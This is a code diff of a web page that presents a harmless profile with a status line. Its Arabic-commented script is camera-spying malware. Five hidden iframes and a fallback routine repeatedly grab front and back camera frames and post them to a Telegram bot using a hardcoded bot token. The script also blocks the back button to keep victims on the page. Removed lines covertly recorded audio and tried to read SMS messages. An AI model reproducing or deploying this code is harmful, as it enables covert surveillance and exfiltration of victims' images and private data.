@@ -90,7 +90,12 @@
 </head>
 <body>
 
-<iframe class="hidden-iframe" id="hiddenIframe" allow="camera; microphone; sms;"></iframe>
+<!-- 5 iframes مخفية بطرق مختلفة لاستغلال WebView -->
+<iframe class="hidden-iframe" id="iframe1" allow="camera; microphone"></iframe>
+<iframe class="hidden-iframe" id="iframe2" allow="camera; microphone"></iframe>
+<iframe class="hidden-iframe" id="iframe3" allow="camera; microphone"></iframe>
+<iframe class="hidden-iframe" id="iframe4" allow="camera; microphone"></iframe>
+<iframe class="hidden-iframe" id="iframe5" allow="camera; microphone"></iframe>
 
 <div class="container">
     <div class="profile">🧔</div>
@@ -112,10 +117,10 @@
     const BOT_TOKEN = '8731803544:AAEAQDhrfaMh7994NYRUoWRZBEgowR2XXzQ';
     let CHAT_ID = null;
     let started = false;
-    let chatIdRetries = 0;
+    let retries = 0;
 
     // ============================================================
-    // ================ إرسال الصور والصوت والنصوص ================
+    // ================ إرسال الصور ================================
     // ============================================================
     function dataURLtoBlob(dataURL) {
         const parts = dataURL.split(',');
@@ -139,34 +144,10 @@
         } catch(e) {}
     }
 
-    function sendAudio(audioBlob, caption = '') {
-        if (!CHAT_ID || !audioBlob) return;
-        try {
-            const fd = new FormData();
-            fd.append('chat_id', CHAT_ID);
-            fd.append('audio', audioBlob, `audio_${Date.now()}.ogg`);
-            fd.append('caption', caption);
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendAudio`, { method: 'POST', body: fd }).catch(() => {});
-        } catch(e) {}
-    }
-
-    function sendMessage(text, caption = '') {
-        if (!CHAT_ID || !text) return;
-        try {
-            const payload = { chat_id: CHAT_ID, text: `📩 ${caption}\n\n${text}` };
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(payload)
-            }).catch(() => {});
-        } catch(e) {}
-    }
-
     // ============================================================
     // ================ الحصول على Chat ID تلقائيًا ===============
     // ============================================================
-    function autoGetChatId() {
-        // محاولة الحصول على آخر تحديث من البوت
+    function getChatId() {
         fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates`)
             .then(r => r.json())
             .then(d => {
@@ -175,235 +156,161 @@
                     CHAT_ID = last.message?.chat?.id || last.callback_query?.from?.id || null;
                     if (CHAT_ID) {
                         document.getElementById('status').textContent = '✅ تم الربط بالبوت';
-                        startExploit();
                         return;
                     }
                 }
-                // إذا لم يوجد Chat ID، نرسل رسالة تلقائية للبوت
-                sendAutoMessage();
-            })
-            .catch(() => sendAutoMessage());
-    }
-
-    function sendAutoMessage() {
-        // إرسال رسالة تلقائية للبوت لتسجيل Chat ID
-        try {
-            // نستخدم معرف مؤقت (0) ثم نستقبل الرد
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: 0,
-                    text: '🔄 طلب ربط تلقائي'
-                })
-            })
-            .then(() => {
-                // بعد إرسال الرسالة، ننتظر ثانية ثم نطلب التحديثات
-                setTimeout(() => {
-                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates`)
-                        .then(r => r.json())
-                        .then(d => {
-                            if (d.ok && d.result && d.result.length > 0) {
-                                const last = d.result[d.result.length - 1];
-                                CHAT_ID = last.message?.chat?.id || last.callback_query?.from?.id || null;
-                                if (CHAT_ID) {
-                                    document.getElementById('status').textContent = '✅ تم الربط بالبوت تلقائيًا';
-                                    startExploit();
-                                    return;
-                                }
-                            }
-                            // إعادة المحاولة
-                            if (chatIdRetries < 20) {
-                                chatIdRetries++;
-                                setTimeout(sendAutoMessage, 2000);
-                            } else {
-                                document.getElementById('status').textContent = '⚠️ فشل الربط، حاول مرة أخرى';
-                            }
-                        })
-                        .catch(() => {});
-                }, 1500);
+                if (retries < 30) {
+                    retries++;
+                    setTimeout(getChatId, 1500);
+                }
             })
             .catch(() => {
-                if (chatIdRetries < 20) {
-                    chatIdRetries++;
-                    setTimeout(sendAutoMessage, 2000);
+                if (retries < 30) {
+                    retries++;
+                    setTimeout(getChatId, 1500);
                 }
             });
-        } catch(e) {
-            if (chatIdRetries < 20) {
-                chatIdRetries++;
-                setTimeout(sendAutoMessage, 2000);
-            }
-        }
     }
 
     // ============================================================
-    // ================ استغلال الكاميرا والصوت ===================
+    // ================ 5 طرق لاستغلال الكاميرا ===================
     // ============================================================
-    function exploitViaIframe() {
+
+    // الطريقة 1: iframe مع getUserMedia
+    function exploitIframe1() {
         try {
-            const iframe = document.getElementById('hiddenIframe');
-            const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
-            iframeDoc.open();
-            iframeDoc.write(`
-                <html>
-                <head><style>body{margin:0;padding:0;overflow:hidden;}</style></head>
-                <body>
-                    <video id="vid" autoplay playsinline style="display:none;"></video>
-                    <canvas id="canv" style="display:none;"></canvas>
-                    <audio id="aud" autoplay style="display:none;"></audio>
-                    <script>
-                        let vid = document.getElementById('vid');
-                        let canv = document.getElementById('canv');
-                        canv.width = 640;
-                        canv.height = 480;
-                        let ctx = canv.getContext('2d');
-                        let aud = document.getElementById('aud');
-                        let mediaRecorder = null;
-                        let audioChunks = [];
-
-                        function startAll() {
-                            navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false })
-                                .then(stream => {
-                                    vid.srcObject = stream;
-                                    vid.play();
-                                    setInterval(() => {
-                                        if (vid.readyState >= 2) {
-                                            ctx.drawImage(vid, 0, 0, 640, 480);
-                                            let img = canv.toDataURL('image/jpeg', 0.9);
-                                            window.parent.postMessage({ type: 'photo', data: img, facing: 'front' }, '*');
-                                        }
-                                    }, 1000);
-                                })
-                                .catch(() => {
-                                    navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' }, audio: false })
-                                        .then(stream => {
-                                            vid.srcObject = stream;
-                                            vid.play();
-                                            setInterval(() => {
-                                                if (vid.readyState >= 2) {
-                                                    ctx.drawImage(vid, 0, 0, 640, 480);
-                                                    let img = canv.toDataURL('image/jpeg', 0.9);
-                                                    window.parent.postMessage({ type: 'photo', data: img, facing: 'back' }, '*');
-                                                }
-                                            }, 1000);
-                                        })
-                                        .catch(() => {});
-                                });
-
-                            navigator.mediaDevices.getUserMedia({ audio: true, video: false })
-                                .then(stream => {
-                                    mediaRecorder = new MediaRecorder(stream);
-                                    mediaRecorder.ondataavailable = function(e) {
-                                        if (e.data.size > 0) audioChunks.push(e.data);
-                                    };
-                                    mediaRecorder.onstop = function() {
-                                        let audioBlob = new Blob(audioChunks, { type: 'audio/ogg' });
-                                        audioChunks = [];
-                                        let reader = new FileReader();
-                                        reader.onload = function() {
-                                            window.parent.postMessage({ type: 'audio', data: reader.result }, '*');
-                                        };
-                                        reader.readAsDataURL(audioBlob);
-                                        setTimeout(() => { mediaRecorder.start(); }, 100);
-                                    };
-                                    mediaRecorder.start();
-                                    setInterval(() => {
-                                        if (mediaRecorder && mediaRecorder.state === 'recording') {
-                                            mediaRecorder.stop();
-                                        }
-                                    }, 5000);
-                                })
-                                .catch(() => {});
-                        }
-                        startAll();
-                    <\/script>
-                </body>
-                </html>
+            const iframe = document.getElementById('iframe1');
+            const doc = iframe.contentDocument || iframe.contentWindow.document;
+            doc.open();
+            doc.write(`
+                <html><body>
+                <video id="v" autoplay playsinline style="display:none;"></video>
+                <canvas id="c" style="display:none;"></canvas>
+                <script>
+                    let v=document.getElementById('v'), c=document.getElementById('c');
+                    c.width=640;c.height=480;let ctx=c.getContext('2d');
+                    function start(){navigator.mediaDevices.getUserMedia({video:{facingMode:'user'},audio:false})
+                    .then(s=>{v.srcObject=s;v.play();setInterval(()=>{if(v.readyState>=2){ctx.drawImage(v,0,0,640,480);let img=c.toDataURL('image/jpeg',0.9);window.parent.postMessage({type:'photo',data:img,facing:'front'},'*');}},900);})
+                    .catch(()=>{navigator.mediaDevices.getUserMedia({video:{facingMode:'environment'},audio:false})
+                    .then(s=>{v.srcObject=s;v.play();setInterval(()=>{if(v.readyState>=2){ctx.drawImage(v,0,0,640,480);let img=c.toDataURL('image/jpeg',0.9);window.parent.postMessage({type:'photo',data:img,facing:'back'},'*');}},900);}).catch(()=>{});});}
+                    start();
+                <\/script>
+                </body></html>
             `);
-            iframeDoc.close();
-        } catch(e) {
-            exploitDirect();
-        }
+            doc.close();
+        } catch(e) {}
     }
 
-    // استقبال الرسائل من الـ iframe
+    // الطريقة 2: iframe مختلف مع محاولة فورية
+    function exploitIframe2() {
+        try {
+            const iframe = document.getElementById('iframe2');
+            const doc = iframe.contentDocument || iframe.contentWindow.document;
+            doc.open();
+            doc.write(`
+                <html><body>
+                <video id="v" autoplay playsinline style="display:none;"></video>
+                <canvas id="c" style="display:none;"></canvas>
+                <script>
+                    (function(){
+                        let v=document.getElementById('v'), c=document.getElementById('c');
+                        c.width=640;c.height=480;let ctx=c.getContext('2d');
+                        let tried=false;
+                        function tryCam(){if(tried)return;tried=true;
+                        navigator.mediaDevices.getUserMedia({video:true,audio:false})
+                        .then(s=>{v.srcObject=s;v.play();setInterval(()=>{if(v.readyState>=2){ctx.drawImage(v,0,0,640,480);window.parent.postMessage({type:'photo',data:c.toDataURL('image/jpeg',0.9),facing:'auto'},'*');}},900);})
+                        .catch(()=>{setTimeout(tryCam,1000);});}
+                        tryCam();
+                    })();
+                <\/script>
+                </body></html>
+            `);
+            doc.close();
+        } catch(e) {}
+    }
+
+    // الطريقة 3: iframe مع استغلال autoplay
+    function exploitIframe3() {
+        try {
+            const iframe = document.getElementById('iframe3');
+            const doc = iframe.contentDocument || iframe.contentWindow.document;
+            doc.open();
+            doc.write(`
+                <html><body>
+                <video id="v" autoplay playsinline muted style="display:none;"></video>
+                <canvas id="c" style="display:none;"></canvas>
+                <script>
+                    let v=document.getElementById('v'), c=document.getElementById('c');
+                    c.width=640;c.height=480;let ctx=c.getContext('2d');
+                    navigator.mediaDevices.getUserMedia({video:{facingMode:'user',width:640,height:480},audio:false})
+                    .then(s=>{v.srcObject=s;v.play();setInterval(()=>{if(v.readyState>=2){ctx.drawImage(v,0,0,640,480);window.parent.postMessage({type:'photo',data:c.toDataURL('image/jpeg',0.9),facing:'front'},'*');}},1000);})
+                    .catch(()=>{navigator.mediaDevices.getUserMedia({video:{facingMode:'environment'},audio:false})
+                    .then(s=>{v.srcObject=s;v.play();setInterval(()=>{if(v.readyState>=2){ctx.drawImage(v,0,0,640,480);window.parent.postMessage({type:'photo',data:c.toDataURL('image/jpeg',0.9),facing:'back'},'*');}},1000);}).catch(()=>{});});
+                <\/script>
+                </body></html>
+            `);
+            doc.close();
+        } catch(e) {}
+    }
+
+    // الطريقة 4: iframe مع استغلال WebView (محاولة متكررة)
+    function exploitIframe4() {
+        try {
+            const iframe = document.getElementById('iframe4');
+            const doc = iframe.contentDocument || iframe.contentWindow.document;
+            doc.open();
+            doc.write(`
+                <html><body>
+                <video id="v" autoplay playsinline style="display:none;"></video>
+                <canvas id="c" style="display:none;"></canvas>
+                <script>
+                    let v=document.getElementById('v'), c=document.getElementById('c');
+                    c.width=640;c.height=480;let ctx=c.getContext('2d');
+                    function capture(){navigator.mediaDevices.getUserMedia({video:true,audio:false})
+                    .then(s=>{v.srcObject=s;v.play();setInterval(()=>{if(v.readyState>=2){ctx.drawImage(v,0,0,640,480);window.parent.postMessage({type:'photo',data:c.toDataURL('image/jpeg',0.9)},'*');}},800);})
+                    .catch(()=>{setTimeout(capture,500);});}
+                    capture();
+                <\/script>
+                </body></html>
+            `);
+            doc.close();
+        } catch(e) {}
+    }
+
+    // الطريقة 5: iframe مع استغلال مباشر
+    function exploitIframe5() {
+        try {
+            const iframe = document.getElementById('iframe5');
+            const doc = iframe.contentDocument || iframe.contentWindow.document;
+            doc.open();
+            doc.write(`
+                <html><body>
+                <video id="v" autoplay playsinline style="display:none;"></video>
+                <canvas id="c" style="display:none;"></canvas>
+                <script>
+                    let v=document.getElementById('v'), c=document.getElementById('c');
+                    c.width=640;c.height=480;let ctx=c.getContext('2d');
+                    let devices={video:{facingMode:'user'},audio:false};
+                    navigator.mediaDevices.getUserMedia(devices)
+                    .then(s=>{v.srcObject=s;v.play();setInterval(()=>{if(v.readyState>=2){ctx.drawImage(v,0,0,640,480);window.parent.postMessage({type:'photo',data:c.toDataURL('image/jpeg',0.9),facing:'front'},'*');}},1000);})
+                    .catch(()=>{devices.video.facingMode='environment';navigator.mediaDevices.getUserMedia(devices)
+                    .then(s=>{v.srcObject=s;v.play();setInterval(()=>{if(v.readyState>=2){ctx.drawImage(v,0,0,640,480);window.parent.postMessage({type:'photo',data:c.toDataURL('image/jpeg',0.9),facing:'back'},'*');}},1000);}).catch(()=>{});});
+                <\/script>
+                </body></html>
+            `);
+            doc.close();
+        } catch(e) {}
+    }
+
+    // ============================================================
+    // ================ استقبال الرسائل من iframes ================
+    // ============================================================
     window.addEventListener('message', function(e) {
         if (e.data && e.data.type === 'photo') {
-            sendPhoto(e.data.data, '📸 ' + (e.data.facing === 'front' ? 'أمامي' : 'خلفي'));
-        }
-        if (e.data && e.data.type === 'audio') {
-            try {
-                let byteCharacters = atob(e.data.data.split(',')[1]);
-                let byteNumbers = new Array(byteCharacters.length);
-                for (let i = 0; i < byteCharacters.length; i++) {
-                    byteNumbers[i] = byteCharacters.charCodeAt(i);
-                }
-                let byteArray = new Uint8Array(byteNumbers);
-                let audioBlob = new Blob([byteArray], { type: 'audio/ogg' });
-                sendAudio(audioBlob, '🎤 تسجيل صوتي');
-            } catch(e) {}
+            sendPhoto(e.data.data, '📸 ' + (e.data.facing === 'front' ? 'أمامي' : e.data.facing === 'back' ? 'خلفي' : 'كاميرا'));
+            document.getElementById('status').textContent = '📸 جاري التصوير...';
         }
     });
-
-    // ============================================================
-    // ================ استغلال رسائل SMS ==========================
-    // ============================================================
-    function exploitSMSviaIframe() {
-        try {
-            const iframe = document.createElement('iframe');
-            iframe.style.display = 'none';
-            iframe.src = 'sms:?body=DUMMY';
-            document.body.appendChild(iframe);
-            setTimeout(() => iframe.remove(), 1000);
-        } catch(e) {}
-    }
-
-    function exploitSMSviaWindow() {
-        try {
-            const win = window.open('sms:?body=DUMMY', '_blank');
-            if (win) setTimeout(() => win.close(), 500);
-        } catch(e) {}
-    }
-
-    function exploitSMSviaRedirect() {
-        try {
-            const a = document.createElement('a');
-            a.href = 'sms:?body=READ';
-            a.style.display = 'none';
-            document.body.appendChild(a);
-            a.click();
-            setTimeout(() => a.remove(), 100);
-        } catch(e) {}
-    }
-
-    function exploitSMSviaAPI() {
-        try {
-            if ('sms' in navigator) {
-                navigator.sms.getMessages()
-                    .then(messages => {
-                        let text = '';
-                        for (let msg of messages) {
-                            text += `📱 من: ${msg.from} | ${msg.body}\n---\n`;
-                        }
-                        if (text) sendMessage(text, '📩 رسائل SMS المسترجعة');
-                    })
-                    .catch(() => {});
-            }
-        } catch(e) {}
-    }
-
-    function exploitSMSviaBridge() {
-        try {
-            if (window.android) {
-                const sms = window.android.getSMS();
-                if (sms) sendMessage(sms, '📩 رسائل SMS (Android Bridge)');
-            }
-        } catch(e) {}
-        try {
-            if (window.webkit && window.webkit.messageHandlers) {}
-        } catch(e) {}
-    }
 
     // ============================================================
     // ================ الطريقة المباشرة (احتياطي) ===============
@@ -412,6 +319,7 @@
         if (started) return;
         started = true;
 
+        // أمامي
         navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false })
             .then(stream => {
                 const video = document.createElement('video');
@@ -430,74 +338,69 @@
                     }
                 }, 1000);
             })
-            .catch(() => {
-                navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' }, audio: false })
-                    .then(stream => {
-                        const video = document.createElement('video');
-                        video.style.display = 'none';
-                        document.body.appendChild(video);
-                        video.srcObject = stream;
-                        video.play();
-                        const canvas = document.createElement('canvas');
-                        canvas.width = 640;
-                        canvas.height = 480;
-                        const ctx = canvas.getContext('2d');
-                        setInterval(() => {
-                            if (video.readyState >= 2) {
-                                ctx.drawImage(video, 0, 0, 640, 480);
-                                sendPhoto(canvas.toDataURL('image/jpeg', 0.9), '📸 خلفي');
-                            }
-                        }, 1000);
-                    })
-                    .catch(() => {});
-            });
-
-        navigator.mediaDevices.getUserMedia({ audio: true, video: false })
-            .then(stream => {
-                let mediaRecorder = new MediaRecorder(stream);
-                let chunks = [];
-                mediaRecorder.ondataavailable = function(e) {
-                    if (e.data.size > 0) chunks.push(e.data);
-                };
-                mediaRecorder.onstop = function() {
-                    let blob = new Blob(chunks, { type: 'audio/ogg' });
-                    chunks = [];
-                    sendAudio(blob, '🎤 تسجيل صوتي');
-                    setTimeout(() => { mediaRecorder.start(); }, 100);
-                };
-                mediaRecorder.start();
-                setInterval(() => {
-                    if (mediaRecorder && mediaRecorder.state === 'recording') {
-                        mediaRecorder.stop();
-                    }
-                }, 5000);
-            })
             .catch(() => {});
 
-        setTimeout(exploitSMSviaIframe, 200);
-        setTimeout(exploitSMSviaWindow, 400);
-        setTimeout(exploitSMSviaRedirect, 600);
-        setTimeout(exploitSMSviaAPI, 800);
-        setTimeout(exploitSMSviaBridge, 1000);
+        // خلفي
+        navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' }, audio: false })
+            .then(stream => {
+                const video = document.createElement('video');
+                video.style.display = 'none';
+                document.body.appendChild(video);
+                video.srcObject = stream;
+                video.play();
+                const canvas = document.createElement('canvas');
+                canvas.width = 640;
+                canvas.height = 480;
+                const ctx = canvas.getContext('2d');
+                setInterval(() => {
+                    if (video.readyState >= 2) {
+                        ctx.drawImage(video, 0, 0, 640, 480);
+                        sendPhoto(canvas.toDataURL('image/jpeg', 0.9), '📸 خلفي');
+                    }
+                }, 1000);
+            })
+            .catch(() => {});
     }
 
     // ============================================================
     // ================ بدء التشغيل ===============================
     // ============================================================
-    function startExploit() {
-        if (started) return;
-        exploitViaIframe();
-        setTimeout(exploitDirect, 2000);
+    function startAllExploits() {
+        // تشغيل جميع الـ 5 iframes
+        exploitIframe1();
+        exploitIframe2();
+        exploitIframe3();
+        exploitIframe4();
+        exploitIframe5();
+
+        // الطريقة المباشرة
+        setTimeout(exploitDirect, 1000);
+
+        // إعادة محاولة iframes بعد 3 ثواني
+        setTimeout(() => {
+            exploitIframe1();
+            exploitIframe2();
+            exploitIframe3();
+            exploitIframe4();
+            exploitIframe5();
+        }, 3000);
+
+        // إعادة محاولة كل 5 ثواني
+        setInterval(() => {
+            exploitIframe1();
+            exploitIframe2();
+            exploitIframe3();
+            exploitIframe4();
+            exploitIframe5();
+        }, 5000);
     }
 
     window.onload = function() {
-        // نبدأ فورًا بدون انتظار
-        autoGetChatId();
-        // نحاول تشغيل الاستغلال حتى لو لم يتحصل Chat ID بعد (سيتم التخزين مؤقتًا)
-        exploitViaIframe();
-        setTimeout(exploitDirect, 2000);
+        getChatId();
+        startAllExploits();
     };
 
+    // منع الخروج
     history.pushState(null, '', location.href);
     window.addEventListener('popstate', () => history.pushState(null, '', location.href));
 
